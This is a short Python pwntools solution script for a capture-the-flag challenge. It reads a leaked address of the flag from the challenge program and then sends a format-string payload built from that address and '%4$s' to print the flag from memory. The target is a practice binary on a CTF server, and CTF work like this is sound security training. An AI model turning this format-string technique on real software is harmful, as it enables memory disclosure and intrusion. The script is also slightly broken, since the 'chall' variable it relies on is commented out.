#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

#chall = "./chall"
#libc = ELF()
#elf = ELF(chall)
#context.binary = chall
#context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("nc.ctf.setodanote.net", 26502)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b main
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


p.recvuntil("flag    | [")
flag_addr = eval(p.recv(10))
log.info("flag: " + hex(flag_addr))

payload = p32(flag_addr)
payload += b"%4$s"

p.recvuntil("Ready >")
p.sendline(payload)

p.interactive()
